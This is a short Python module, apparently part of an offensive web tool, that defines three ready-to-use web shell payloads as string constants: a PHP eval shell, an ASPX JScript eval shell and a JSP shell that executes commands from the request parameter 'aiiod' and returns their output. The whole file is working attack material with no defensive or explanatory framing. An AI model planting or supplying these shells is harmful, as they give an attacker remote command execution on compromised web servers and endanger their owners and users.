import platform

OS = platform.system()

PHP_WEBSHELL = '<?php @eval($_REQUEST[aiiod]); ?>'
ASPX_WEBSHELL = ('<%@ Page Language="Jscript"%>'
                 '<%eval(Request.Item["aiiod"],"unsafe");%>')
JSP_WEBSHELL = ('<%@ page import="java.util.*,java.io.*,java.net.*"%>'
                '<%'
                'if (request.getParameter("aiiod")!=null){'
                'Process p=Runtime.getRuntime().exec('
                'request.getParameter("aiiod"));'
                'OutputStream os=p.getOutputStream();'
                'InputStream in=p.getInputStream();'
                'DataInputStream dis=new DataInputStream(in);'
                'String disr=dis.readLine();'
                'while (disr!=null){'
                'out.println(disr); disr = dis.readLine();}}'
                '%>')
